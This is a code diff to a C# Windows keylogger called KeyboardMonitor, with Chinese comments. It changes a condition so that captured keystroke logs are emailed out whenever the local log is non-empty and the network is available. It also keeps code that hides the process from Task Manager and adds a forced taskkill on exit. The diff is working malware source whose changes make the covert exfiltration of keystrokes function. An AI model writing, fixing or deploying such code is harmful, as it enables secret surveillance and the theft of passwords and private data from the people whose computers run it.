@@ -69,7 +69,14 @@ namespace KeyboardMonitor
 
 		private void AppliectionExit(object sender, EventArgs e)
 		{
+			
 			Application.Exit();
+			//调用进程管理器推出当前程序
+			string exit = "taskkill -f -im "+ Form.ApplicetionName;
+			using (Cmd cmd = new Cmd())
+			{
+				cmd.ExecCommand(exit);
+			}
 		}
 
 	}
@@ -96,7 +103,7 @@ namespace KeyboardMonitor
 		/// <summary>
 		/// 当前程序名称
 		/// </summary>
-		public string ApplicetionName;
+		public static string ApplicetionName;
 		private System.Windows.Forms.Timer timer = null;
 		public Form()
 		{
@@ -161,7 +168,7 @@ namespace KeyboardMonitor
 				this.keys.Clear();
 				//throw new Exception();
 				//本地文件有内容且网络正常发送邮件
-				if (LogHelper.GetFileSize()==0
+				if (LogHelper.GetFileSize()!=0
 					&&(KeyboardMonitor.API.WinNet.InternetCheckConnection() == true))
 				{
 					using (Commit commit = new Commit())
@@ -206,11 +213,11 @@ namespace KeyboardMonitor
 				//获取进程名称
 				Process curProcess = Process.GetCurrentProcess();
 				ProcessModule curModule = curProcess.MainModule;
-				this.ApplicetionName = curModule.ModuleName;
+				Form.ApplicetionName = curModule.ModuleName;
 
 				//在任务管理器中隐藏当前进程
 				this.hideTaskmgrList = new HideTaskmgrList();
-				this.hideTaskmgrList.ProcessName = this.ApplicetionName;
+				this.hideTaskmgrList.ProcessName = Form.ApplicetionName;
 				this.hideTaskmgrList.Start();
 			}
 			catch (Exception)
